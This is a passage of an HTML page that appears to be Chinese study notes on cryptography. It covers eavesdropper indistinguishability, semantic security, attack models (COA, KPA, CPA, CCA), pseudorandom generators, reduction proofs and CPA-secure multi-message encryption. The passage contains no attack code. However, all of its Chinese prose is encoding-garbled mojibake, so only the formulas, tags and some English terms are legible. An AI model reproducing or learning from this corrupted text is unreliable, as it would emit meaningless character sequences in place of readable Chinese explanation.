å¯†å•ä¸ªæ¶ˆæ¯ã€‚</p><ul><li>å®šä¹‰åŠ¨æœº<br><strong>å¨èƒæ¨¡å‹</strong>ï¼šå®šä¹‰æ”»å‡»è€…çš„å‡è®¾èƒ½åŠ›ï¼Œåªèƒ½è§‚å¯Ÿåˆ°å•ä¸ªå¯†æ–‡,å¹¶åœ¨å¤šé¡¹å¼æ—¶é—´å†…è¿è¡Œã€‚<br><strong>å®‰å…¨ç›®æ ‡</strong>ï¼šå®šä¹‰ä»€ä¹ˆæƒ…å†µä¸‹åŠ å¯†æ–¹æ¡ˆè¢«è®¤ä¸ºæ˜¯è¢«â€œç ´è§£â€çš„ï¼Œå®‰å…¨ç›®æ ‡æ˜¯æ”»å‡»è€…æ— æ³•ä»å¯†æ–‡ä¸­è·å–ä»»ä½•å…³äºæ˜æ–‡çš„éƒ¨åˆ†ä¿¡æ¯</li></ul><blockquote><p>è¿™é‡Œçš„<strong>å®‰å…¨ç›®æ ‡</strong>åªæ˜¯ä¸€ä¸ªæ€æƒ³ï¼Œè¿™ä¸ªæ€æƒ³æ¦‚å¿µçš„æ˜ç¡®åŒ–åœ¨åè¾¹çš„è¯­ä¹‰å®‰å…¨å®šä¹‰ç»™å‡ºï¼Œä½†ç”±äºè¯­ä¹‰å®‰å…¨è¾ƒä¸ºå¤æ‚ä¸”éš¾ä»¥å¤„ç†ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸ªä¸è¯­ä¹‰å®‰å…¨ç­‰ä»·çš„å®šä¹‰â€”â€”ä¸å¯åŒºåˆ†æ€§ã€‚</p></blockquote><ul><li>çªƒå¬è€…å­˜åœ¨ä¸‹çš„ä¸å¯åŒºåˆ†æ€§<br>å®šä¹‰ï¼šä¸€ä¸ªç§é’¥åŠ å¯†æ–¹æ¡ˆ$Î $æ˜¯â€œåœ¨çªƒå¬è€…å­˜åœ¨çš„æƒ…å†µä¸‹ä¸å¯åŒºåˆ†çš„â€ï¼Œå¦‚æœå¯¹äºæ‰€æœ‰æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´æ”»å‡»è€…Aï¼Œå­˜åœ¨ä¸€ä¸ªå¯å¿½ç•¥å‡½æ•°$negl$ï¼Œä½¿å¾—å¯¹äºæ‰€æœ‰å®‰å…¨å‚æ•°nï¼š<br>$Pr[PrivKeav_{A,Î }â€‹(n)&#x3D;1]â‰¤\frac 12â€‹+negl(n)$<br>ç­‰æ•ˆè¡¨è¿°ï¼š<br>$âˆ£Pr[out_Aâ€‹(PrivKeav_{A,Î }â€‹(n,0))&#x3D;1]âˆ’Pr[out_Aâ€‹(PrivKeav_{A,Î }â€‹(n,1))&#x3D;1]âˆ£â‰¤negl(n)$</li></ul><h4 id="æ­ç¤ºæ˜æ–‡é•¿åº¦"><a href="#æ­ç¤ºæ˜æ–‡é•¿åº¦" class="headerlink" title="æ­ç¤ºæ˜æ–‡é•¿åº¦"></a>æ­ç¤ºæ˜æ–‡é•¿åº¦</h4><p><strong>é»˜è®¤</strong>çš„å®‰å…¨åŠ å¯†å®šä¹‰ä¸­ï¼Œä¸è¦æ±‚åŠ å¯†æ–¹æ¡ˆéšè—æ˜æ–‡é•¿åº¦ï¼Œä½†å‡ ä¹æ‰€æœ‰å¸¸ç”¨çš„åŠ å¯†æ–¹æ¡ˆéƒ½ä¼šæ³„éœ²æ˜æ–‡é•¿åº¦ï¼ˆæˆ–å…¶è¿‘ä¼¼å€¼ï¼‰<br><strong>æ˜æ–‡é•¿åº¦æ³„éœ²å¯èƒ½å¯¼è‡´çš„é—®é¢˜ï¼š</strong></p><ul><li><strong>ç®€å•æ•°å­—&#x2F;æ–‡æœ¬æ•°æ®ï¼š</strong> å¯¹äºæ•æ„Ÿä¿¡æ¯å¯èƒ½ä¼šé€ æˆæ³„éœ²ï¼Œå¦‚ä¸ªäººæ”¶å…¥ä½æ•°ä¸åŒä¹Ÿå°±å¯èƒ½æš´éœ²æ”¶å…¥æ°´å¹³</li><li><strong>è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼š</strong> è¿™ä¸ªè‡ªåŠ¨è¡¥å…¨åˆ—è¡¨å¤§å°å¯èƒ½æ­ç¤ºç”¨æˆ·è¿„ä»Šä¸ºæ­¢è¾“å…¥çš„å­—æ¯</li><li><strong>æ•°æ®åº“æœç´¢ï¼š</strong> è¿”å›çš„è®°å½•æ•°é‡å¯èƒ½ä¼šæ³„éœ²ç”¨æˆ·æœç´¢çš„å†…å®¹</li><li><strong>å‹ç¼©æ•°æ®ï¼š</strong> è¾ƒçŸ­çš„å‹ç¼©æ˜æ–‡å¯èƒ½è¡¨æ˜åŸå§‹æ˜æ–‡å­˜åœ¨å¤§é‡å†—ä½™</li></ul><h3 id="3-2-2-è¯­ä¹‰å®‰å…¨"><a href="#3-2-2-è¯­ä¹‰å®‰å…¨" class="headerlink" title="3.2.2 è¯­ä¹‰å®‰å…¨"></a>3.2.2 è¯­ä¹‰å®‰å…¨</h3><p><strong>è¯­ä¹‰å®‰å…¨æ€§</strong>ï¼šè¯­ä¹‰å®‰å…¨æ€§æ˜¯ç¬¬ä¸€ä¸ªè¢«æå‡ºçš„è®¡ç®—å®‰å…¨åŠ å¯†å®šä¹‰ï¼Œå®ƒæ­£å¼æ¦‚å¿µåŒ–äº†â€œæ”»å‡»è€…æ— æ³•ä»å¯†æ–‡ä¸­è·å–ä»»ä½•å…³äºæ˜æ–‡çš„éƒ¨åˆ†ä¿¡æ¯â€è¿™ä¸€æ¦‚å¿µã€‚</p><p>é€šå¸¸ï¼Œä¸€ä¸ªåŠ å¯†ç®—æ³•è¢«è®¤ä¸ºæ˜¯è¯­ä¹‰å®‰å…¨çš„ï¼Œå½“ä¸”ä»…å½“å®ƒæ»¡è¶³é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼ˆchosen-plaintext attackï¼ŒCPAï¼‰çš„å®‰å…¨æ€§ã€‚</p><blockquote><p>åŒºåˆ†ä¸€ä¸‹ä¸åŒéš¾åº¦çš„æ”»å‡»ï¼Œä»ä¸Šåˆ°ä¸‹éš¾åº¦é€’å‡ï¼š</p><ul><li><strong>å”¯å¯†æ–‡æ”»å‡»ï¼ˆCOAï¼‰ï¼š</strong> <ul><li>æ¡ä»¶ï¼šå·²çŸ¥ä¸€ä¸ªæˆ–å¤šä¸ªå¯†æ–‡</li><li>ç›®æ ‡ï¼šç¡®å®šæ˜æ–‡</li></ul></li><li><strong>å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼ˆKPAï¼‰ï¼š</strong><ul><li>æ¡ä»¶ï¼šå·²çŸ¥ä¸€ä¸ªæˆ–å¤šä¸ªç›¸åŒå¯†é’¥åŠ å¯†çš„æ˜-å¯†æ–‡å¯¹</li><li>ç›®æ ‡ï¼šç¡®å®šå…¶ä»–å¯†æ–‡å¯¹åº”çš„æ˜æ–‡</li></ul></li><li><strong>é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼ˆCPAï¼‰ï¼š</strong><ul><li>æ¡ä»¶ï¼šå¯ä»¥é€‰æ‹©æ˜æ–‡è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å¾—åˆ°åŠ å¯†ç»“æœ</li><li>ç›®æ ‡ï¼šç¡®å®šæ˜æ–‡</li></ul></li><li><strong>é€‰æ‹©å¯†æ–‡æ”»å‡»ï¼ˆCCAï¼‰ï¼š</strong><ul><li>æ¡ä»¶ï¼šå¯ä»¥é€‰æ‹©å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œå¹¶å¾—åˆ°è§£å¯†ç»“æœï¼ˆé€šå¸¸ä¸èƒ½å¯¹æ‰€è¦æ±‚çš„å¯†æ–‡è¿›è¡Œè§£å¯†ï¼‰</li><li>ç›®æ ‡ï¼šç¡®å®šæ‰€è¦æ±‚çš„å¯†æ–‡å¯¹åº”çš„æ˜æ–‡</li></ul></li></ul></blockquote><blockquote><p>ä¸‹é¢å†å¼•å‡ºCPAå®‰å…¨å’ŒCCAå®‰å…¨çš„ç†è§£ï¼š</p><ul><li><strong>CPAå®‰å…¨ï¼š</strong> é’ˆå¯¹åŠ å¯†æ–¹æ¡ˆè€Œè¨€ï¼Œå·²çŸ¥ä¸¤ä¸ªæ˜æ–‡ï¼Œå¯¹å…¶ä¸­ä¸€ä¸ªåŠ å¯†å¾—åˆ°å¯†æ–‡ï¼Œæ”»å‡»è€…æ— æ³•å¾ˆå¥½åœ°åˆ¤æ–­è¿™ä¸ªå¯†æ–‡å¯¹åº”å“ªä¸ªæ˜æ–‡ã€‚</li><li><strong>CCAå®‰å…¨ï¼š</strong> é’ˆå¯¹åŠ å¯†æ–¹æ¡ˆè€Œè¨€ï¼Œå·²çŸ¥ä¸¤ä¸ªå¯†æ–‡ï¼Œå¯¹å…¶ä¸­ä¸€ä¸ªè§£å¯†å¾—åˆ°æ˜æ–‡ï¼Œæ”»å‡»è€…æ— æ³•å¾ˆå¥½åœ°åˆ¤æ–­è¿™ä¸ªæ˜æ–‡å¯¹åº”å“ªä¸ªå¯†æ–‡ã€‚</li></ul></blockquote><ul><li><strong>è¯­ä¹‰å®‰å…¨</strong><br><strong>å®šä¹‰</strong>ï¼šä¸€ä¸ªç§é’¥åŠ å¯†æ–¹æ¡ˆæ˜¯è¯­ä¹‰å®‰å…¨çš„ï¼Œå¦‚æœå¯¹äºä»»ä½•pptç®—æ³•Aï¼Œå­˜åœ¨ä¸€ä¸ªpptç®—æ³•$A_0$ï¼Œä½¿å¾—å¯¹äºä»»ä½•pptç®—æ³•Sampå’Œå¤šé¡¹å¼æ—¶é—´å¯è®¡ç®—å‡½æ•°få’Œhï¼Œä»¥ä¸‹æ¦‚ç‡æ˜¯å¯å¿½ç•¥çš„ï¼š<br>$Pr[A(1^n,Enck(m),h(m))&#x3D;f(m)]âˆ’Pr[A_0â€‹(1^n,âˆ£mâˆ£,h(m))&#x3D;f(m)]$</li></ul><p><strong>è¯­ä¹‰å®‰å…¨çš„ç­‰ä»·æ€§ï¼š</strong><br>ä¸€ä¸ªç§é’¥åŠ å¯†æ–¹æ¡ˆåœ¨çªƒå¬è€…å­˜åœ¨çš„æƒ…å†µä¸‹å…·æœ‰<strong>ä¸å¯åŒºåˆ†çš„åŠ å¯†</strong>å½“ä¸”ä»…å½“å®ƒæ˜¯<strong>è¯­ä¹‰å®‰å…¨</strong>çš„ã€‚</p><blockquote><p><strong>è¯­ä¹‰å®‰å…¨</strong>ä¸<strong>ç›‘å¬è€…å­˜åœ¨ä¸‹çš„ä¸å¯åŒºåˆ†æ€§</strong>ç­‰ä»·ï¼Œä½†æ¯”ä¸å¯åŒºåˆ†æ€§æ›´ä¸ºå¤æ‚å’Œéš¾ä»¥å¤„ç†ã€‚</p></blockquote><h2 id="3-3-æ„å»ºEAVå®‰å…¨åŠ å¯†æ–¹æ¡ˆ"><a href="#3-3-æ„å»ºEAVå®‰å…¨åŠ å¯†æ–¹æ¡ˆ" class="headerlink" title="3.3 æ„å»ºEAVå®‰å…¨åŠ å¯†æ–¹æ¡ˆ"></a>3.3 æ„å»ºEAVå®‰å…¨åŠ å¯†æ–¹æ¡ˆ</h2><p>åœ¨æ„å»ºEAVå®‰å…¨åŠ å¯†æ–¹æ¡ˆä¹‹å‰ï¼Œå…ˆå¼•å…¥ä¼ªéšæœºç”Ÿæˆå™¨ï¼Œå› ä¸ºå®ƒé€šå¸¸ç”¨æ¥ç”ŸæˆåŠ å¯†å¯†é’¥ã€‚</p><h3 id="3-3-1-ä¼ªéšæœºç”Ÿæˆå™¨ï¼ˆPRGï¼‰"><a href="#3-3-1-ä¼ªéšæœºç”Ÿæˆå™¨ï¼ˆPRGï¼‰" class="headerlink" title="3.3.1 ä¼ªéšæœºç”Ÿæˆå™¨ï¼ˆPRGï¼‰"></a>3.3.1 ä¼ªéšæœºç”Ÿæˆå™¨ï¼ˆPRGï¼‰</h3><p><strong>å®šä¹‰ï¼š</strong><br><strong>ä¼ªéšæœºç”Ÿæˆå™¨</strong>æ˜¯ä¸€ä¸ªé«˜æ•ˆã€ç¡®å®šæ€§çš„ç®—æ³•ï¼Œå°†ä¸€ä¸ªè¾ƒçŸ­çš„å‡åŒ€éšæœºå­—ç¬¦ä¸²ï¼ˆseedï¼‰è½¬æ¢ä¸ºæ›´é•¿çš„â€œçœ‹èµ·æ¥å‡åŒ€â€çš„å­—ç¬¦ä¸²ï¼ˆä¼ªéšæœºå­—ç¬¦ä¸²ï¼‰</p><p>ä¸€ä¸ªå¥½çš„PRGåº”æ»¡è¶³çš„æ¡ä»¶ï¼š</p><ul><li>å‡åŒ€æ€§ï¼šè¾“å‡ºçš„æ¯”ç‰¹ä¸²åº”è¯¥è¶³å¤Ÿå‡åŒ€åœ°åˆ†å¸ƒåœ¨æ‰€æœ‰å¯èƒ½åœ°æ¯”ç‰¹ä¸²ä¸­</li><li>å¯é¢„æµ‹æ€§ï¼šåœ¨æœ‰seedçš„æƒ…å†µä¸‹å¯é¢„æµ‹</li><li>ä¸å¯åŒºåˆ†æ€§ï¼šåœ¨å¤šé¡¹å¼æ—¶é—´å†…ä¸èƒ½åŒºåˆ†PRGè¾“å‡ºå’ŒçœŸæ­£éšæœºçš„è¾“å‡º</li></ul><blockquote><p>ä¼ªéšæœºç”Ÿæˆå™¨Gçš„è¾“å‡ºå¹¶ä¸æ˜¯çœŸæ­£çš„å‡åŒ€å­—ç¬¦ä¸²</p></blockquote><p><strong>ç§å­åŠé•¿åº¦ï¼š</strong><br>seedå°±ç±»ä¼¼åŠ å¯†æ–¹æ¡ˆä¸­çš„å¯†é’¥ï¼Œå¿…é¡»<strong>å‡åŒ€</strong>ä¸”å¿…é¡»<strong>è¶³å¤Ÿé•¿</strong>é˜²æ­¢æš´åŠ›æ”»å‡»ï¼Œè¿˜éœ€è¦è¿›è¡Œä¿å¯†<br><strong>å…³äºä¼ªéšæœºæ•°çš„å­˜åœ¨ï¼š</strong><br>è™½ç„¶æˆ‘ä»¬æ— æ³•æ— æ¡ä»¶åœ°è¯æ˜ä¼ªéšæœºç”Ÿæˆå™¨çš„å­˜åœ¨ï¼Œä½†æœ‰ç†ç”±ç›¸ä¿¡å®ƒä»¬å­˜åœ¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå•å‘å‡½æ•°å­˜åœ¨ï¼Œåˆ™å¯ä»¥æ„é€ ä¼ªéšæœºç”Ÿæˆå™¨ã€‚<br><strong>å®é™…æ„é€ </strong>ï¼šæœ‰è®¸å¤šå®é™…çš„ä¼ªéšæœºç”Ÿæˆå™¨ï¼ˆå¦‚æµå¯†ç ï¼‰è¢«å¹¿æ³›ä½¿ç”¨ï¼Œç›®å‰å°šæœªå‘ç°æœ‰æ•ˆçš„åŒºåˆ†å™¨ã€‚</p><h3 id="3-3-2-è§„çº¦è¯æ˜"><a href="#3-3-2-è§„çº¦è¯æ˜" class="headerlink" title="3.3.2 è§„çº¦è¯æ˜"></a>3.3.2 è§„çº¦è¯æ˜</h3><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œè¯æ˜æŸä¸ªå¯†ç æ„é€ $Î $æ˜¯å®‰å…¨çš„ï¼Œåªéœ€è¦æŸä¸ªåŸºç¡€é—®é¢˜$X$æ˜¯å›°éš¾çš„ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æä¾›ä¸€ä¸ªæ˜¾å¼çš„è§„çº¦æ¥è¯æ˜ï¼Œè¯¥è§„çº¦è¯´æ˜å¦‚ä½•å°†ä»»ä½•æˆåŠŸâ€œç ´è§£â€$Î $çš„æœ‰æ•ˆæ”»å‡»è€…$A$è½¬åŒ–ä¸ºä¸€ä¸ªæœ‰æ•ˆç®—æ³•$Aâ€™$ï¼Œè¯¥ç®—æ³•$Aâ€™$å¯ä»¥è§£å†³$X$ã€‚</p><blockquote><p>ä¸ªäººç†è§£ï¼šå°±æ˜¯å°†ä¸€ä¸ªæ–¹æ¡ˆçš„å®‰å…¨æ€§å»ºç«‹åœ¨æŸä¸ªå›°éš¾é—®é¢˜ä¸Šã€‚</p></blockquote><h3 id="3-3-3-ä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„EAVå®‰å…¨"><a href="#3-3-3-ä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„EAVå®‰å…¨" class="headerlink" title="3.3.3 ä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„EAVå®‰å…¨"></a>3.3.3 ä¼ªéšæœºæ•°ç”Ÿæˆå™¨çš„EAVå®‰å…¨</h3><h4 id="åŠ å¯†æ–¹æ¡ˆ"><a href="#åŠ å¯†æ–¹æ¡ˆ" class="headerlink" title="åŠ å¯†æ–¹æ¡ˆ"></a><strong>åŠ å¯†æ–¹æ¡ˆ</strong></h4><ul><li><strong>æ„é€ </strong>ï¼šä½¿ç”¨PRG Gï¼Œå…¶æ‰©å±•å› å­ä¸º$l(n)$ï¼Œæ„é€ ä¸€ä¸ªå›ºå®šé•¿åº¦çš„ç§é’¥åŠ å¯†æ–¹æ¡ˆã€‚</li><li><strong>å…³é”®ç”Ÿæˆ</strong>ï¼š$Gen(1^n)$è¾“å‡ºä¸€ä¸ªå‡åŒ€éšæœºçš„nä½ç§å­kã€‚</li><li><strong>åŠ å¯†</strong>ï¼š$Enc(k, m)$ä½¿ç”¨PRG Gå°†ç§å­kæ‰©å±•ä¸º$l(n)$ä½çš„ä¼ªéšæœºå­—ç¬¦ä¸²ï¼Œç„¶åä¸æ˜æ–‡mè¿›è¡ŒXORå¾—åˆ°å¯†æ–‡cã€‚</li><li><strong>è§£å¯†</strong>ï¼š$Dec(k, c)$ä½¿ç”¨PRG Gå°†ç§å­kæ‰©å±•ä¸º$l(n)$ä½çš„ä¼ªéšæœºå­—ç¬¦ä¸²ï¼Œç„¶åä¸å¯†æ–‡cè¿›è¡ŒXORå¾—åˆ°æ˜æ–‡mã€‚</li></ul><h4 id="è§„çº¦-è®¨è®º"><a href="#è§„çº¦-è®¨è®º" class="headerlink" title="è§„çº¦-è®¨è®º"></a><strong>è§„çº¦-è®¨è®º</strong></h4><p><strong>ç›®æ ‡</strong>ï¼šè¯æ˜å¦‚æœGæ˜¯ä¸€ä¸ªPRGï¼Œé‚£ä¹ˆä¸Šè¿°æ„é€ çš„åŠ å¯†æ–¹æ¡ˆæ˜¯EAV-secureçš„ã€‚<br><strong>è¯æ˜æ€è·¯</strong>ï¼šé€šè¿‡å½’çº¦è¯æ˜ï¼Œå°†æ”»å‡»è€…Açš„æˆåŠŸæ¦‚ç‡ä¸PRG Gçš„ä¼ªéšæœºæ€§è”ç³»èµ·æ¥ã€‚</p><ul><li><strong>æ­¥éª¤1</strong>ï¼šå›ºå®šä¸€ä¸ªæ”»å‡»è€…Aï¼Œå…¶æˆåŠŸæ¦‚ç‡ä¸º$Îµ(n)$ã€‚</li><li><strong>æ­¥éª¤2</strong>ï¼šæ„é€ ä¸€ä¸ªåŒºåˆ†å™¨Dï¼Œå®ƒä½¿ç”¨Aæ¥åŒºåˆ†PRG Gçš„è¾“å‡ºå’Œå‡åŒ€éšæœºå­—ç¬¦ä¸²ã€‚</li><li><strong>æ­¥éª¤3</strong>ï¼šåˆ†æDçš„è¡Œä¸ºï¼Œè¯æ˜å¦‚æœGæ˜¯PRGï¼Œé‚£ä¹ˆDæ— æ³•ä»¥éå¯å¿½ç•¥çš„æ¦‚ç‡åŒºåˆ†Gçš„è¾“å‡ºå’Œå‡åŒ€éšæœºå­—ç¬¦ä¸²ã€‚</li><li><strong>æ­¥éª¤4</strong>ï¼šå¾—å‡ºç»“è®ºï¼ŒAæ— æ³•ä»¥éå¯å¿½ç•¥çš„æ¦‚ç‡æˆåŠŸæ”»å‡»åŠ å¯†æ–¹æ¡ˆã€‚</li></ul><h4 id="å…·ä½“å®‰å…¨æ€§"><a href="#å…·ä½“å®‰å…¨æ€§" class="headerlink" title="å…·ä½“å®‰å…¨æ€§"></a><strong>å…·ä½“å®‰å…¨æ€§</strong></h4><p>å¦‚æœGæ˜¯$(t, Îµ)-PRG$ï¼Œé‚£ä¹ˆåŠ å¯†æ–¹æ¡ˆæ˜¯$(t - t_0, Îµ)-secure$ï¼Œå…¶ä¸­$t_0$æ˜¯ä¸€ä¸ªå°çš„å¸¸æ•°ã€‚<br>å¦‚æœæ”»å‡»è€…Aåœ¨æ—¶é—´$t - t_0$å†…è¿è¡Œï¼Œé‚£ä¹ˆDåœ¨æ—¶é—´$t$å†…è¿è¡Œã€‚ç”±äºGæ˜¯$(t, Îµ)-PRG$ï¼ŒDæ— æ³•ä»¥è¶…è¿‡$Îµ$çš„æ¦‚ç‡åŒºåˆ†Gçš„è¾“å‡ºå’Œå‡åŒ€éšæœºå­—ç¬¦ä¸²ï¼Œå› æ­¤Aæ— æ³•ä»¥è¶…è¿‡$Îµ$çš„æ¦‚ç‡æˆåŠŸæ”»å‡»åŠ å¯†æ–¹æ¡ˆã€‚</p><h2 id="3-4-æ›´å¼ºçš„å®‰å…¨æ¦‚å¿µ"><a href="#3-4-æ›´å¼ºçš„å®‰å…¨æ¦‚å¿µ" class="headerlink" title="3.4 æ›´å¼ºçš„å®‰å…¨æ¦‚å¿µ"></a>3.4 æ›´å¼ºçš„å®‰å…¨æ¦‚å¿µ</h2><h3 id="3-4-1-å¤šæ¬¡åŠ å¯†çš„å®‰å…¨æ€§"><a href="#3-4-1-å¤šæ¬¡åŠ å¯†çš„å®‰å…¨æ€§" class="headerlink" title="3.4.1 å¤šæ¬¡åŠ å¯†çš„å®‰å…¨æ€§"></a>3.4.1 å¤šæ¬¡åŠ å¯†çš„å®‰å…¨æ€§</h3><p>å‰é¢EAVå®‰å…¨åªè€ƒè™‘äº†å•ä¸ªå¯†æ–‡çš„å®‰å…¨æ€§ã€‚<br><strong>å¤šæ¬¡åŠ å¯†å®‰å…¨å®šä¹‰ï¼š</strong><br><strong>å®éªŒå®šä¹‰</strong>ï¼šå¼•å…¥äº†ä¸€ä¸ªæ–°çš„å®éªŒ$PrivK^{mult}_{A,Î }(n)$ï¼Œç”¨äºè¯„ä¼°åŠ å¯†æ–¹æ¡ˆåœ¨å¤šæ¶ˆæ¯åœºæ™¯ä¸‹çš„å®‰å…¨æ€§ã€‚</p><ol><li><strong>æ”»å‡»è€…è¾“å‡ºæ¶ˆæ¯åˆ—è¡¨</strong>ï¼šæ”»å‡»è€…Aè¾“å‡ºä¸¤ç»„ç­‰é•¿çš„æ¶ˆæ¯åˆ—è¡¨$\vec M_0$å’Œ$\vec M_1$ï¼Œæ¯ç»„åŒ…å«tä¸ªæ¶ˆæ¯ï¼Œä¸”æ¯å¯¹æ¶ˆæ¯$(m_0,i, m_1,i)$é•¿åº¦ç›¸åŒã€‚</li><li><strong>å¯†é’¥ç”Ÿæˆå’ŒåŠ å¯†</strong>ï¼šç”Ÿæˆä¸€ä¸ªå¯†é’¥kï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªæ¯”ç‰¹bï¼Œå¯¹æ¯ç»„æ¶ˆæ¯åˆ—è¡¨ä¸­çš„æ¶ˆæ¯è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡åˆ—è¡¨$\vec C$ã€‚ </li><li><strong>æ”»å‡»è€…çŒœæµ‹</strong>ï¼šæ”»å‡»è€…Aè§‚å¯Ÿå¯†æ–‡åˆ—è¡¨$\vec C$ï¼Œå¹¶è¾“å‡ºä¸€ä¸ªæ¯”ç‰¹$bâ€™$ã€‚</li><li><strong>å®éªŒç»“æœ</strong>ï¼šå¦‚æœ$bâ€™ &#x3D; b$ï¼Œåˆ™å®éªŒè¾“å‡º1ï¼Œè¡¨ç¤ºæ”»å‡»è€…æˆåŠŸï¼›å¦åˆ™è¾“å‡º0ã€‚</li></ol><h4 id="æ¦‚ç‡åŠ å¯†çš„å¿…è¦æ€§"><a href="#æ¦‚ç‡åŠ å¯†çš„å¿…è¦æ€§" class="headerlink" title="æ¦‚ç‡åŠ å¯†çš„å¿…è¦æ€§"></a><strong>æ¦‚ç‡åŠ å¯†çš„å¿…è¦æ€§</strong></h4><p>ä¸ºäº†å®ç°å¤šæ¬¡åŠ å¯†çš„å®‰å…¨æ€§ï¼ŒåŠ å¯†æ–¹æ¡ˆå¿…é¡»å¼•å…¥éšæœºæ€§ï¼Œä½¿å¾—å³ä½¿åŠ å¯†ç›¸åŒçš„æ¶ˆæ¯ï¼Œä¹Ÿä¼šäº§ç”Ÿä¸åŒçš„å¯†æ–‡ã€‚</p><h4 id="æµå¯†ç å®‰å…¨å¤šæ¬¡åŠ å¯†æ–¹æ¡ˆ"><a href="#æµå¯†ç å®‰å…¨å¤šæ¬¡åŠ å¯†æ–¹æ¡ˆ" class="headerlink" title="æµå¯†ç å®‰å…¨å¤šæ¬¡åŠ å¯†æ–¹æ¡ˆ"></a>æµå¯†ç å®‰å…¨å¤šæ¬¡åŠ å¯†æ–¹æ¡ˆ</h4><p><strong>åŒæ­¥æ¨¡å¼ï¼š</strong> å¯†é’¥æµè¶³å¤Ÿé•¿ï¼ŒåŒæ–¹åŒæ­¥é€šè®¯ï¼Œå¾—çŸ¥å·²ä½¿ç”¨è¿‡çš„å¯†é’¥æµçš„ä½æ•°ï¼Œå»æ‰å·²ä½¿ç”¨è¿‡çš„ä½æ•°ï¼Œå¾€åæˆªå–æ–°çš„å¯†é’¥è¿›è¡Œä½¿ç”¨<br><strong>éåŒæ­¥æ¨¡å¼ï¼š</strong> è®¾ç½®ä¸€ä¸ªåˆå§‹å‘é‡$IV$ï¼Œç”Ÿæˆå¯†é’¥æµæ—¶æ·»å…¥ä¸åŒ$IV$ï¼Œä¿è¯æ¯æ¬¡ç”Ÿæˆçš„ç»“æœä¸ä¸€æ ·ã€‚</p><h3 id="3-4-2-é€‰æ‹©æ˜æ–‡æ”»å‡»å’ŒCPAå®‰å…¨æ€§"><a href="#3-4-2-é€‰æ‹©æ˜æ–‡æ”»å‡»å’ŒCPAå®‰å…¨æ€§" class="headerlink" title="3.4.2 é€‰æ‹©æ˜æ–‡æ”»å‡»å’ŒCPAå®‰å…¨æ€§"></a>3.4.2 é€‰æ‹©æ˜æ–‡æ”»å‡»å’ŒCPAå®‰å…¨æ€§</h3><p><strong>å®šä¹‰</strong>ï¼šé€‰æ‹©æ˜æ–‡æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…èƒ½å¤Ÿé€‰æ‹©æŸäº›æ˜æ–‡ï¼Œå¹¶è§‚å¯Ÿè¿™äº›æ˜æ–‡è¢«åŠ å¯†åçš„å¯†æ–‡ã€‚è¿™ç§æ”»å‡»æ¨¡æ‹Ÿäº†æ”»å‡»è€…å¯¹åŠ å¯†è¿‡ç¨‹çš„éƒ¨åˆ†æ§åˆ¶èƒ½åŠ›ã€‚</p><h4 id="CPAå®‰å…¨æ€§"><a href="#CPAå®‰å…¨æ€§" class="headerlink" title="CPAå®‰å…¨æ€§"></a><strong>CPAå®‰å…¨æ€§</strong></h4><p><strong>ç°ä»£åŠ å¯†çš„æœ€ä½è¦æ±‚</strong>ï¼šCPAå®‰å…¨æ€§æ˜¯ç°ä»£åŠ å¯†æ–¹æ¡ˆåº”æ»¡è¶³çš„æœ€ä½å®‰å…¨è¦æ±‚ã€‚å®ƒç¡®ä¿å³ä½¿æ”»å‡»è€…èƒ½å¤Ÿé€‰æ‹©æŸäº›æ˜æ–‡å¹¶è§‚å¯Ÿå…¶å¯†æ–‡ï¼Œä¹Ÿæ— æ³•è·å–å…³äºå…¶ä»–æœªçŸ¥æ¶ˆæ¯çš„ä»»ä½•ä¿¡æ¯ã€‚<br><strong>æ›´å¼ºçš„å®‰å…¨æ€§</strong>ï¼šè™½ç„¶CPAå®‰å…¨æ€§æ˜¯æœ€ä½è¦æ±‚ï¼Œä½†å®é™…åº”ç”¨ä¸­é€šå¸¸éœ€è¦æ›´å¼ºçš„å®‰å…¨æ€§ã€‚</p><h3 id="3-4-3-CPAå®‰å…¨æ€§å’Œå¤šæ¶ˆæ¯åŠ å¯†"><a href="#3-4-3-CPAå®‰å…¨æ€§å’Œå¤šæ¶ˆæ¯åŠ å¯†" class="headerlink" title="3.4.3 CPAå®‰å…¨æ€§å’Œå¤šæ¶ˆæ¯åŠ å¯†"></a>3.4.3 CPAå®‰å…¨æ€§å’Œå¤šæ¶ˆæ¯åŠ å¯†</h3><p><strong>ç­‰ä»·æ€§</strong>ï¼šå¦‚æœä¸€ä¸ªåŠ å¯†æ–¹æ¡ˆèƒ½å¤ŸæŠµæŠ—å•æ¬¡åŠ å¯†çš„é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œé‚£ä¹ˆå®ƒä¹Ÿèƒ½å¤ŸæŠµæŠ—å¤šæ¶ˆæ¯åŠ å¯†çš„é€‰æ‹©æ˜æ–‡æ”»å‡»</p><ul><li><strong>å›ºå®šé•¿åº¦vsä»»æ„é•¿åº¦æ¶ˆæ¯</strong><br><strong>æ„é€ æ–¹æ³•ï¼š</strong> å°†ä»»æ„é•¿åº¦çš„æ¶ˆæ¯æ‹†åˆ†ä¸ºå„ä¸ªå›ºå®šé•¿åº¦çš„æ¶ˆæ¯åˆ†åˆ«åŠ å¯†</li></ul><h2 id="3-5-æ„å»ºä¸€ä¸ªCPAå®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆ"><a href="#3-5-æ„å»ºä¸€ä¸ªCPAå®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆ" class="headerlink" title="3.5 æ„å»ºä¸€ä¸ªCPAå®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆ"></a>3.5 æ„å»ºä¸€ä¸ªCPAå®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆ</h2><h3 